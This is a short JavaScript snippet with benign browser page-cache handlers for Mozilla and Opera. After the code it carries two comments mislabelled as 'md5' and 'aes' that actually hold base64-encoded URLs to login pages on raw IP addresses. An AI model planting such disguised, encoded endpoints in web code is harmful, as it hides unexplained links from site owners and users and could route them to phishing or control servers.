if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjkyLjkyLjY5OjgwMDgvIy9sb2dpbi9sb2dpbixodHRwOi8vNDcuMTA4LjE5Ny4xNTU6ODAwOC8jL2xvZ2luL2xvZ2luLA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/